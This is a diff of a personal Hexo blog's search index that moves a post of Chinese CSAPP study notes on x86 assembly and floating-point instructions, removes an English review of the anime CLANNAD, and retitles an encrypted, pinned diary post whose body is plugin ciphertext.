+<li>csapp中所有的浮点指令前面都加了字母“v”，目前gcc（mingw 10.3）已经弃用。int转float和double指令后面的“l”是以前没有的。</li>
+<li>与csapp不同，目前带有三个参数的浮点指令已经不复存在。</li>
+<li>与csapp中<strong>生僻</strong>的float~double自转指令（vunpcklps、vcvtps2pd、vmovddup、vcvtpd2psx）不同，gcc先把寄存器的值拷贝到内存，再使用cvt指令。 </li>
+</ol>
+</blockquote>
+<p>浮点运算符：略，汇编语句肉眼可见。</p>
+<p>浮点中的位运算：只针对操作数均位于寄存器内部。</p>
+<p>浮点运算中的立即数：预先以IEEE标准存放在内存里，参与运算时再复制到%xmm寄存器。</p>
+<p>浮点比较指令：</p>
+<p>comiss：float比较。</p>
+<p>comisd：double比较。</p>
+<p>比较时会设置3种标识符：CF、ZF、PF。其中PF=1当且仅当两个操作数任意一个是NaN，此时结果会为Unordered.</p>
+<p>（课后习题虽好，可惜不能对答案，算了不做了。）</p>
+<h2 id="小结——1-22-2022"><a href="#小结——1-22-2022" class="headerlink" title="小结——1/22/2022"></a>小结——1/22/2022</h2><p><strong>x86汇编终于学完了，✿✿ヽ(ﾟ▽ﾟ)ノ✿完结撒花！</strong></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>陇剑杯入土记</title>
     <url>/2021/09/14/ctf01.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>刚进校不久，我们就被老师鼓励去打首届陇剑杯，当我看到比赛说明的考纲范围时，就发现考察范围与我学习的知识毫无交集。</p>
@@ -773,187 +954,6 @@
         <tag>pwn</tag>
         <tag>misc</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>（近期不更新）csapp学习笔记</title>
-    <url>/2022/01/15/csapp.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>（本文汇编代码统一采用AT&amp;T语法）</p>
-<blockquote>
-<p>友情提示：</p>
-<p>看这本书，笔记、习题、实验三者缺一不可。</p>
-<p>如果你觉得中文翻译质量欠佳，想选择英文原版阅读，那么千万不要选择Global Edition！因为Global Edition的习题环节错误百出，有许多题答案根本无法与题目相对应，严重影响阅读体验和对知识的理解！（我就是白嫖了github上面的免费资源，虽然不是影印版，而且正文质量很高，但习题这个问题就可以盖过其他所有优点）。我现在不得不边看英文原文边做中文版本上的习题(lll￢ω￢)</p>
-</blockquote>
-<span id="more"></span>
-<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1><p>一个接下所有章节的outline，<del>可以作为计算机系统导论的复习材料。</del></p>
-<h1 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h1><p>之前草草看过一遍，没做题，现在都搞不清楚浮点数的<strong>最小/最大非规格化数</strong>和<strong>最小/最大规格化数</strong>是怎么算出来的。</p>
-<p>有空再填坑。</p>
-<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h2><p>讲了一下Intel处理器的历史，顺便提了一下SSE和AVX指令集（我觉得自己将来都要学的，又要开始秃头了(lll￢ω￢)</p>
-<h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>如何在linux环境下查看gcc编译的AT&amp;T格式的汇编代码。（其实gdb提供了变更格式为intel的操作）</p>
-<h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><ul>
-<li>char</li>
-<li>short</li>
-<li>int</li>
-<li>long（即long long，下同）</li>
-<li>float</li>
-<li>double</li>
-<li>指针（本书是64位环境，所有指针均为8字节）</li>
-</ul>
-<h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>各种寄存器（rax~rdx，rsi，rdi，rbp，rsp，r8~r15，及对应的32位、16位、8位版本）及<strong>约定俗成的</strong>用法见下图。</p>
-<p><img src="/2022/01/15/csapp/reg.png"></p>
-<p>mov指令（movq、movl、movw、movb、movzbw、movsbq等，后两者是类型强转）。</p>
-<h2 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h2><p>lea——取地址，外加简单算术指令，类似于a+b*c的形式（表示字节数的q、l、w、b字母省略，下同）</p>
-<p>sf、zf、pf、cf、af、of——各种标志符(flag)</p>
-<p>add、sub、(i)mul、(i)div、shl(sal)、shr、sar——改变flag状态</p>
-<p>inc、dec——不改变flag状态</p>
-<p>cqto——64位转128位，做128位除法有用</p>
-<h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>if、switch、while、do-while、for的汇编实现，这部分作业错误尤其多。</p>
-<p>由于cpu具有分支预测的功能（部分语句准确率可达90%），简单if语句会预先计算两种分支之后寄存器的变化，以提高cpu的运行速度。</p>
-<p>对于多分支、取值接近的switch语句，编译器会构造跳表来代替各种jz、jbe等判断语句，以提高代码执行效率，因为跳表的执行速度不受分支个数的影响。</p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>再一次复习堆栈调用的汇编实现，将一个栈帧的各个部分（return address, saved registers, local variables, argument build area）都讲到了，很细致。</p>
-<p>64位寄存器传参的顺序为<code>%rdi</code>,<code>%rsi</code>,<code>%rdx</code>,<code>%rcx</code>,<code>%r8</code>,<code>%r9</code>.</p>
-<h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>lea指令的作用就是专门为访问数组设计的。</p>
-<p>虽然编译器更喜欢使用指针遍历数组，加上一个固定的值。即使是多维数组遍历，也尽量不用我们数据结构课学到的i*Wid+j这个公式——毕竟乘法太费时间了。</p>
-<h2 id="异数的数据结构——1-15-2022"><a href="#异数的数据结构——1-15-2022" class="headerlink" title="异数的数据结构——1/15/2022"></a>异数的数据结构——1/15/2022</h2><p>讲了struct、union和空间对齐。</p>
-<p><strong>union中的大小是其中最大数据类型的大小。</strong></p>
-<p>使用union可以强转数据类型（比如说把double转成unsigned long）。</p>
-<p>结构体中的每一项数据的地址都必须是其类型大小的整数倍。</p>
-<h2 id="在机器级程序中将控制与数据结合起来——1-16-2022"><a href="#在机器级程序中将控制与数据结合起来——1-16-2022" class="headerlink" title="在机器级程序中将控制与数据结合起来——1/16/2022"></a>在机器级程序中将控制与数据结合起来——1/16/2022</h2><p>指针与地址运算的优先级——判断以下程序的输出结果：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">20</span>]=&#123;<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *p=&amp;arr;</span><br><span class="line">	*(p+<span class="number">8</span>)+=<span class="number">9</span>;</span><br><span class="line">	<span class="keyword">int</span> m=*((<span class="keyword">char</span>*)p+<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> n=*((<span class="keyword">char</span>*)(p+<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,m,n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>答案是<code>8 11</code>.</p>
-<p>int (*p)(int, *int)——函数指针，用<code>p = fun</code>调用，用<code>res = p(int, &amp;int)</code>返回int。</p>
-<p>int *p(int, *int)——指针函数，返回一个int*指针。</p>
-<p>gdb的各种调试命令（对于安了peda的人，就b、si、ni、x/s、x/wx可能有点用，因为peda把寄存器、汇编、堆栈啥都给你显示完了）：</p>
-<p><img src="/2022/01/15/csapp/gdb.png"></p>
-<blockquote>
-<p>习题3.46的<strong>正文</strong>错误：</p>
-<p>global edition: <code>get_line</code> is called with the return address equal to <del>0x400776</del> 0x400076.</p>
-<p>Chinese edition: 字符 0~9 的 ASCII 码是 <del>0x3~0x39</del> 0x30~0x39.</p>
-</blockquote>
-<p>在堆栈图中，地址从下到上，从右到左逐渐增大。因此对于一个dword(qword)，数据的储存方式是从左到右（小端序）；而单个字节的储存方式是从右到左。</p>
-<blockquote>
-<p>疑问：</p>
-<p>D题中，当<code>get_line</code>函数返回时，损毁的寄存器应该还有%rip，而不只是答案所说的%rbx.</p>
-</blockquote>
-<p>防止栈溢出的三种主要方式：地址空间随机化（ASLR）、栈保护（canary）和内存不可执行（NX）。</p>
-<p>对长度可变栈的汇编支持——栈底指针rbp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pushq %rbp</span><br><span class="line">movq %rsp, %rbp</span><br><span class="line">;procedure in the function</span><br><span class="line">leave </span><br><span class="line">;movq %rbp, %rsp</span><br><span class="line">;popq %rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-<p><del>书上说最近的编译器取消了使用栈底指针的惯例</del>实际上，我用最新的编译器，随便写个hello world都会使用栈底指针，这个惯例依旧保持着。</p>
-<blockquote>
-<p>疑问：</p>
-<p>课后习题的B题为什么s2舍入到“最近的8的倍数”，D题为什么“保留s1的偏移量为最近的16的倍数”？</p>
-</blockquote>
-<h2 id="浮点代码——1-19-2022"><a href="#浮点代码——1-19-2022" class="headerlink" title="浮点代码——1/19/2022"></a>浮点代码——1/19/2022</h2><p>寄存器：</p>
-<p>%ymm0~%ymm15是256位的浮点寄存器。</p>
-<p>%xmm0~%xmm15是128位的浮点寄存器，处于ymm的低128位。</p>
-<p>前8个寄存器可视为函数参数（特别地，%xmm0为<strong>约定俗成</strong>的返回值，类似于%rax），后8个由调用者保存。</p>
-<p>在内存与寄存器中移动浮点数：</p>
-<p>movss：移动float（从%xmm移动到一段32位的内存区域，或反之）</p>
-<p>movsd：移动double（从%xmm移动到一段64位的内存区域，或反之）</p>
-<p>在寄存器间移动：</p>
-<p>movaps：打包移动float</p>
-<p>movapd：打包移动double</p>
-<p><strong>与整型寄存器类似，不能将一个内存的值直接移到另一个内存</strong>。</p>
-<p>浮点与整型的转换（src也可以为mem，此处省去）：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>(src type)\(dst type)</th>
-<th>int</th>
-<th>long</th>
-<th>float</th>
-<th>double</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>int</td>
-<td>\\</td>
-<td>cltq</td>
-<td>cvtsi2ssl %eax %xmm0</td>
-<td>cvtsi2sdl %eax %xmm0</td>
-</tr>
-<tr>
-<td>long</td>
-<td>%eax</td>
-<td>\\</td>
-<td>cvtsi2ssq %rax %xmm0</td>
-<td>cvtsi2sdq %rax %xmm0</td>
-</tr>
-<tr>
-<td>float</td>
-<td>cvttss2si %xmm0 %eax</td>
-<td>cvttss2siq %xmm0 %rax</td>
-<td>\\</td>
-<td>cvtss2sd mem %xmm0</td>
-</tr>
-<tr>
-<td>double</td>
-<td>cvttsd2si %xmm0 %eax</td>
-<td>cvttsd2siq %xmm0 %rax</td>
-<td>cvtsd2ss mem %xmm0</td>
-<td>\\</td>
-</tr>
-</tbody>
-</table>
-</div>
-<blockquote>
-<p>此处csapp的指令与现行编译器的汇编语法产生了较大分歧，该表以现行标准为准。现列出以下不同点：</p>
-<ol>
-<li>csapp中所有的浮点指令前面都加了字母“v”，目前gcc（mingw 10.3）已经弃用。int转float和double指令后面的“l”是以前没有的。</li>
-<li>与csapp不同，目前带有三个参数的浮点指令已经不复存在。</li>
-<li>与csapp中<strong>生僻</strong>的float~double自转指令（vunpcklps、vcvtps2pd、vmovddup、vcvtpd2psx）不同，gcc先把寄存器的值拷贝到内存，再使用cvt指令。 </li>
-</ol>
-</blockquote>
-<p>浮点运算符：略，汇编语句肉眼可见。</p>
-<p>浮点中的位运算：只针对操作数均位于寄存器内部。</p>
-<p>浮点运算中的立即数：预先以IEEE标准存放在内存里，参与运算时再复制到%xmm寄存器。</p>
-<p>浮点比较指令：</p>
-<p>comiss：float比较。</p>
-<p>comisd：double比较。</p>
-<p>比较时会设置3种标识符：CF、ZF、PF。其中PF=1当且仅当两个操作数任意一个是NaN，此时结果会为Unordered.</p>
-<p>（课后习题虽好，可惜不能对答案，算了不做了。）</p>
-<h2 id="小结——1-22-2022"><a href="#小结——1-22-2022" class="headerlink" title="小结——1/22/2022"></a>小结——1/22/2022</h2><p><strong>x86汇编终于学完了，✿✿ヽ(ﾟ▽ﾟ)ノ✿完结撒花！</strong></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Twenty-three——review of CLANNAD (anime)</title>
-    <url>/2021/11/17/clannad.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Followed by my last English post “bewilderment”, I’m thrilling to find the right path to go on. I suddenly realized that during my high school times, one of my roommates recommended me to watch CLANNAD (short for CL later). I refused for overwhelming pressure several months before college entrance examination. But now I’m free but depressed, I think it’s just the time to watch it in order to guide my heart. </p>
-<p>This is the 3rd anime I watched besides <em>Working Cells</em> and <em>Future Diary</em>. After ten days striving not to weep, I succeeded. Unlike others said that the anime brings you tears, I prefer it gives you warmth and courage during rough times. (Maybe I haven’t been struggling in a hard situation so there’s no empathy for me to cry.) CL, as is shown in title, tells a story of several families, the transformation through time. It’s just a brief summary of life, although kind of idealized.</p>
-<p>I’m here to talk about some profound sentences and try to seize the essence of the story, otherwise they would be erode by time again.</p>
-<span id="more"></span>
-<p><strong>The English meaning of word “clannad” is “family”</strong>, so all of these sentences have something to do with the significance of family and companion, which run through all scenarios of the story. </p>
-<p>(SPOILER WARNING!!!)</p>
-<p><strong>What makes you not degenerate is neither talent nor love, but the family, or someone who can control yourself. </strong></p>
-<p>Responsibility is one of the main topic CL wants to convey. It is also responsibility that makes Tomoya changed himself from a bad guy to a great father. For instance, before his encounter with Nagisa, he hated this town and treated everything meaningless. <strong>“Because of her, my life eventually filled with color again.”</strong> Therefore he determined to care her as long as he could. From a boy hating school, to a man with high EQ, and finally a wonderful father, the responsibility he took totally transformed himself. </p>
-<p>This is the same for Nagisa. Due to her poor health (a cold is like cancer for her while nothing for Yuno instead uh-huh), she was often absent. What’s more she was also introvert and few classmates noticed her. Therefore, she had almost no friends. The appearance of Tomoya encouraged her to be outgoing and to <strong>go and find whatever she wants</strong>. With Tomoya and his friends’ help, Nagisa rebuilt the drama club, performed her favorite drama story, and made her and her family’s dream come true.</p>
-<p><img src="/2021/11/17/clannad/392528.png"></p>
-<p>In CLANNAD ~AFTER STORY~ (short for CL-2 later), Nagisa passed away because of dystocia (difficult birth). Losing his beloved wife made Tomoya numb, he refused to raise his daughter Ushio, instead, he resorted to alcohol and cigarettes just for escaping from the unrecoverable wound, the intangible past. After 5 years, Ushio happened to have a trip with Tomoya. An unexpected talk with grandma aroused him as role of a father, which made him finally find out <strong>“the one and only precious thing worthwhile to be care for”</strong> asked by Nagisa. He knew what it means to be a father at last.  </p>
-<p>The “confinement” and unbelievable change of Tomoya and Nagisa can move everyone who watched CL by heart. Maybe it is just a kind of feeling —— growth, maturity and family.</p>
-<p><strong>The dream of kids is the dream of family, we didn’t give up our dreams, we just find a sustenance on your dream. That’s how parents do and how family do.</strong></p>
-<p>Dream is also an important main idea during the story. On the last night of school anniversary, Nagisa found that her parents gave up their dream to raise her up. She was so regretful and nervous that she sobbed in her drama program the next day. At the critical moment, her father rushed up to tell her don’t be self-criticized and on the contrary, stick to the drama show in hand, for this is the expectation of the whole family. I believe it is one of the most moving scene because it is awfully true in today’s world. Parents have sacrificed a lot for our growth, isn’t it?  </p>
-<p>The most controversial character is Tomoya’s father Naoyuki. He seems to be useless and hampered Tomoya’s life. As Tomoya’s closest relative, the plot didn’t uncover his background for a long time. That’s because only Tomoya himself also becomes a father can he experience the difficulty of his father. The situation of two fathers is just the same —— losing the most important half in their life. However, Naoyuki didn’t give up raising Tomoya, instead he always bought toys and snacks to bring up his son. When his son grew up, he has already lost money, job, opportunity —— everything. He was so painful that he only had a benevolent smile. In this way, Naoyuki is truly an honorable father.</p>
-<p><strong>There are something awful that happened in our lives, however the fine moments, when time passes, will be sent down and remain in your hand.</strong></p>
-<p>The last main topic of CL is happiness and love. The legend of the town is about the glowing ball. It only appears when someone feels happy and beloved and people who gain the shining thing could make their dream come true. To move a step closer, if the town has its own thoughts, it is people who love this town makes the town happy, and the town loves the people living in it. Therefore, the town realized Tomoya’s dream and the miracle happened. </p>
-<p>We all know that when seniors recall their whole lives, they remember their delighted moments clearly. This plot also tells us that only the happy things won’t be washed away by time. So don’t be blue when life beats you, please think that there are more possibilities in future and lots of uncovered happiness are waiting for us. Also, always be grateful and helpful to others, as one day they may help you realize your dream. </p>
-<p>By the way, how residents treat others expanded the definition of word “family”, and this is a symbol of Mo Theory —— to love others equally without distinction. However, this is kind of biased from our topic so I don’t want to expand it.</p>
-<p>In general, CL has brought me the inner strength that I lacked in the past. I finally know how much my family love me and they’re always cheering me up. However, it doesn’t tell me how to find my way, it just motivates me to <strong>follow my own heart</strong>. I wonder if I would have some new feelings after several years to watch CL again. I’m looking forward to that day comes.</p>
-<p><img src="/2021/11/17/clannad/R.jpg"></p>
-<blockquote>
-<p>PS: </p>
-<ul>
-<li>only 30% of bilibili users have watched the true ending (Tomoya tells Ushio about his life). That’s kind of disappointing. </li>
-<li>To practice my listening skills and get more details, I’m watching CL English dubbed version for a second time.</li>
-</ul>
-</blockquote>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>（转载）我家跨上了“信息高速路”</title>
@@ -2311,7 +2311,7 @@
       </tags>
   </entry>
   <entry>
-    <title>碎碎念</title>
+    <title>（置顶）碎碎念</title>
     <url>/2038/01/19/%E7%A2%8E%E7%A2%8E%E5%BF%B5.html</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
   <script id="hbeData" type="hbeData" data-hmacdigest="93d24dee367f03c2176c7d1681757660840dd026286b3d27384db1ba3891b4b1">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec11e2312a5d4ceb5e2aadac9c4363471e7bcaf41f992ea7712d75943fde8bfabb64f8ecd8b8076af6711c58d6c1dbdcd520f418c247d8811b10404a981d540156f3d027819ef91d00bfcdb9ef8ec20ec4c3b49909a9255c6e1a1ac04d27a5e8619ce7ff1a57a894ed25be367fd9b33ea0f532221e36c25dd7f263dbb71e97fd06aa61f93bd8bab8d8f46c5f67c48e41957bcec6aa11f7ba3b7431f12306f8466ff0623b1c5324feda48995b26e678e9e87921a5167121673e2eb3fa5bbfd684b0407e5c767e6b0500bdbfb70f00cd93ad8c7f1b711362ff02f08983ca8927ae653df793b9a446072789f4b971e05710ab10685a542fe269d1d5cdd7674ace1f00336f004f4b36a49292c731d176c2b42f3c1ebb78732fc21085a4ae687f689b4ff1d5c3f59b0a45b5e1b55e8f2f3d0bbc2826aeb32daa6aac80ae062472d039d5ff0a8c771b7b574d414157fd9215f6605ac2361f49eb6c4db32d834d1406e3792899a9d49badd0426206680408c89f4339596fa53482a0535f17166ad94d95bfaba8a1eda0d6bd722d2755b20cb44be3ffc672d5f8d999fb6ad81d216c0b2e6133d9048be1e455b487a5d41585416b50a75c4f333e9588f1d7aaaae77d80605671958496584c21e0cc64e2f8e98d46c66b03cc967f7552c663815b9b2666111df6c46189fa2666c53380dff5e71ec63b81b49785354b6fafab231055eb40d60f4ec8ddd3bff5825c64b95ecba47fd4757b328fbd5c94a99e5af8b1ca596068f9952eeca6ca27b4d282a1ae00e40475ad377f3fd7aa9b0fccddbdd926fbb5ac71d14c2af0bd6963a1e34107e93df21669bc06866c3a6d743f331bae76905ca3cb48bcee373d00da454f8b8049bf52f0d0c544e0d810d95b440ecade88245b3eae7e745d42a3a9a0f7edc80ec37a626da779ffcf7359d44040ace57051635556e699357ac43b291ef251ce40b4ba0e0cc4adc4ed76829455e6efd499fbac8884a890f518deb332e96a2d0cb5306cabc93279778b9c7e1e6f255bcd0f758eb5e8d14db06f224f8e2f486e21aa68105d7cf1de359432f9e747ea5653337e60b8c0931be96baf4ae7172c0a7b25e43957c38be775a8d97815649e3ff0e3930aacbb4873e991ade143c9eaf755d4fa730273acf8dfe9c9582ac891a6b539ab64c8860cb3891b8f356dc47414aef0a7240902a49499d85c9cb1b9556ce82721413a83da84eccdfd29a6999093ea7d475a502b659c155399ecf5ce0d313d43fddd86178d099a2bc03910e495e380ed7c4bfe90b9d91f195e065666243e21151816c7d84729fbef4c54d079018ad98651925db5bcacb2d1489344035e21cdb6cb64ff78a6dccdfe706180bb81636c1544d14ba86539d1cb68029de8bee605946a61a4c684a9556cda318f8e4c137b923359f94e38ae5f3bbd95ad87c7623952d8ea01b5869e4f9b779d1b1bfc513eff8b45725977b11f0e56196fb18b48ea9afdd253f12944f9308ab9142cbe7a2612be098d86a71738b9cc2011154b89d7bc5361d54e50f89b5e82106499392ae61e8a5407ee9ba8731bab2ae24f29f0762308fef296ed4dc0fb82ad26004f4688d47f815966dfb3365ec31456068857dc78e9cd3b33ae49d21731791fa23650e58831a6517354dc2dd81e338b87787ec3161be29583e6d740c9e3ad74bf0cae0a8560f3442a5bd2a59297cb805b84297920bb6de009a9d01c14b64f22830c7c87ed8d5b85ab648edd8ba60162db8698cb731e319142159e3805307b6c16a2fb50ae12d8da45d49890c74ea4d09430043adecf9f32bd87c7abb92c375102653602c2bc37c5641c52334ccd38323ff64f8d1ffd22a4964a6aabccdf93e5d3784814140863bae229b254dd2c0691ef4285f5afcac9d2a9931263b30803d12565028966e17b626a71981411d0509ccbdc9d2d83087e9c829354e9aa0b360f70f1a7bec0a1e31075ff619e243486171610d9e493fbb059e265103429bf21b94fbfeed502f7321954bbbee3a26619d33b0582f5797c989315aa5d989dc5cc0982095df6a6791ff559e7529db455577f11f4cba733f87e182f708e784e3d951276f3d489c90afe925b501c5daeb37f9febd2751053185a1fd82950c874a7dcbb796adbbfcae6e8d923c65b355dd7781c38962b24a98b66ab062e6527fd8ebd022f75e399102623522954ea38183aa6de7926971003b8a14b5d615ac0c40264dca9cfebd79c050f3201dd1fbcef7fadaaba7e1a9e21477abeddf17847fec1ac0e534bd7befa75c0f763f986f5529cc2272e91510d2c71b69f2209d1fec12abd16b3c90bb2480aab448f18e55682b1a31f8acedb8b7bb90a28e87abf20c74c1cf01b46b8edb719a49c327ab36870b2622cdece2719859b4bac2e38edabd00d0685c800c503893f83118de446a7ed0d710622a259fa9797743293931042810ef7b0a86140b21c3e88ea14862393739f209a3f5d8321a6cde8412f0d34b6c48649a3e7f04941f64009ae84ec7d825dc80ab9b3999981d506f1ab1d6463da8e6307be6b43cda0ec284ad4df0785b4a34757c21e26f4dbae4b1b739e56e48c1ceecb60632c9e1c2a41c323419e7a1a581689c7ae9477c8a4e6d2057bd03a44162f50ca8f802485360f6456fc924411c1126ccbd279196ae5f5b72310c758887779c01ec9f55d7dcb62682364344999de7bb863a8ff8278a7ab1b6ef65ff538ec35f7f5c8016fb6506980b124938940b98d1dba6ecdfefd66d1a16c02d7da605431604003ac663747cf24079815284b3fa06812640b86d31ef481e894e5f0f5800d93099ac840410f5b6255f9b87dfff5d52f9995ac6637a3202948ffbf6fdb5a8a2f0472e7b942fc917d47cd4ed84c9659bb66ac539eb95dc346259b0bac143feedf36818ddf164f9cb2361f844844297415f96851202de6d3a8ea2a658f85579efc1e47133cc56b1c00ac06048e3698f953943ebbb0cc270b95037068b9f17893079141e9c9e577f9ce949687a0926f29accb42a6054b3007b351b8f7d4f77279391c708df9c833db8c8a60886224d8d2d038f1e4b508f9ec2788b5235b9ea9fcc81c49559b14b5fb29c4d519adbf50fef475cc6273984d97752f2f1f5b19441ba2f94ad3df9a744b71c547c4a5e7ae871556ac6eae0391a0820afafab1a2120276a78dd008e66c80056f549bf807f65d55559cfdb64204d840a6cef3473d7ccf59fc2185b2c0f8c9131741fef2c57b2d38c92c0e44d7431d833d43ddba824b8bba7065758a0c8c514c88bf79516a8516b1debf938677a238aa4b9f1f428b1ae6980f5310ca0428c780cc54ecd53c691c7706774d5eb7b659f0893d6a623db0979e5b3da6543e3c8fd6467a29042abecafab665d31d53de234efdd0c6bf7f6869bc34ad6de4024d8dc618463f15ac9160f1f630ed07035a611be5a2ff4d9a6b455c6bde76258c868d1533f1eea8dcde8157b402ffd20d04c3eadc0da27ce06aa32706eabed3bfc9d901ab58b41eeb204f2d43cb0feee37014676d0887b0910baa75a1075029c4c7b57786c2a42980d132b4b8e81a0bd87488d23c4e379b461f97dce455c8dd8be2eb5c2e007f14cb2163284896f2379bcfb09d67a85f46b929bd08267347f6486f0519b92d00ed744bbb713a64437bd10a55155690df790134080949eed0ae140e6e412f23368b205a4fdf6a4db36d4e98a678fdfb8b40eec880d35e962391763cf5840b4a1d8d3c61cfdd438d67a45244977d68bef9f4928c4dbc7cb4de01ca6a92bd6c2a2cae460b52106c8cbcd1aec196a9607aa4ed79772aa2817068ded33bcdcafffc6e909e252831b6b3cbf7b7c5d0d21099e2d5eefaf5093cd6f691f5530ce2f6174febb4eec42e82bd038814f3e20350100d44b76620bee20252edac62881f76f36e3045af99dfdf10cb0dd57a97a49167d7230fedc0f3be9a7289de727f894e4aad590558ec688e4c3360abffe10720409623d4afc0648e2e11bb7341143b7eeff3e084b1e76fdca5398d68a10b2be9e388f60f6428567a361262813bb49f2236a542cfd5b7e9b95413b3a6736d90511c2bfcafbe6a62d7a79ef6a9e7ee96dcc440f36f028a43cfa207de3ef8122700979087f59084222c9a706e091a894276370533dccc14c90f338e0b424537e435884456e4f0d934ac2c4349ef7db25461d88d206c543208965b10b4e76a4cf715a26c1699018d82be3055ce9effef1ff4016700e5203485c7b6b83fba556efcb08a6d796b27b10a27c3617cac7330ec58f7c76fc78414f1bfe3f8c34d78bf171eee95475bf147469e35b540b122a8f342eb2f40bb5dd1d27b6565ea8c064c9e662329ff6157bf7575740f778e7e0b17b1480b0e64cadb0f7f229babc5c361feaf1290043e3b11fcb9837f3ff5d281dd71fd93f8c2cda05616607a780ba17dce721e1c0fb8a711b70c8f76d350687f185622460fd6ceeb18ad330989acea4329bd0005bbb6e0c8f76bf220381843980be62c17adc3c04ae037e51a8cd46f883f374eff8a087e0971c5a22473c2b5ca925ed046925647717f8a7231cb3a64078a596487bc1957acd0738078fcb6ba515502ca663497da8f48e8966ea5f40df245a58f2dba941db0f699bd99702078c222197439b58485a85bf6efbd0395f6107787f33de990480cf67d77eafa434b3c81d9950faaac4a32cd52c66a0d48dc31ee93f9ba902db84e0f1cb367afd9936a5b90bc782c0f3a166a63a812f5d9f4e08e42f85a03ec330eee40a2e2712fa701f2457011d0851ec64498ee1665013935206ab2d0b17cb930e4e85d49d167ee518ae9ead39df1a593089f0b31a3a64f4f4cc1530a4d4008e0985e1bc8b81a4154f869522119afbf4f9e9dc2caec731e346a45d5a1af794cee3cb6a2f7f33cf57f1e0778ed8a946a999387c3eacc975c7ca82b6f4698ccf9ddc6b318d4127c9cf01423b194754dc1c3aa710400a05a057b78a901c9eac9720eaaa482a18378ae5da5b6bec510f5bb803f83af30bc2845bbc6a83fb1c45d47e4fe2cf4cef6dd67593a6593949ca4cbf1dad0e2f24413ce71c7be5a5ea31ed6fca984d37e927244ecf4cd77a8702e4a8c81f3b58897bde9fa90a1cbea451807ecaccc0cd22f9268419c78de5515b3bf740c7a59efb65425a4b12440188db6d5523cd87d42d6212eb40672473a35b399117271ec0dfd8fb879b7088eebcbc38f2f5b1adedf288b33373eed8c62f7e28c46fbfc5313ba3dd52d8704b3c095cca9632a752b635990f611a7b59786e2d09557202dba5d0a15fc7d2a1f6b24e15ff254d4f27b540b73db68687236b7c06bc514b154757cf559bcbf38694310a06632aa2168391d7968726d5e60e9faac439d0d3adab5f328ffaa94a5f423896336e872809543f5d09b114ebfe9ca581042d5f8627f00466762df323034c77a5b5ae0382f8d6a2ef9c0d9fd6ef63e2c0e170d9f85284a0d230816ac53cb3556222b586806049145ffdd2539c703c99d1d07d64309cb24c9cc418f010bc7ae8d457a2b0487c49cbdc3f77d60e7563eb010599c594e4b75609a10479fef207db3b7207cd46d359449e925455b58de54a7827dd9b0de9d906c0e274c1cd587c96fe16fcd5bcc716122e8dd7b2c3548aec565c8689e238dc1245ef0f2618b3d279d5c840902d5959f835d8edfb6cf378b7fa9d25f78714af14378b94989203ce0c75f01ef37f701ddaccd179ad97f702194f3b379f03701f798f854f3a532718aab1d51d5916e8ab35c40536719ac1225daf7cc19e83c2f3fdb8f2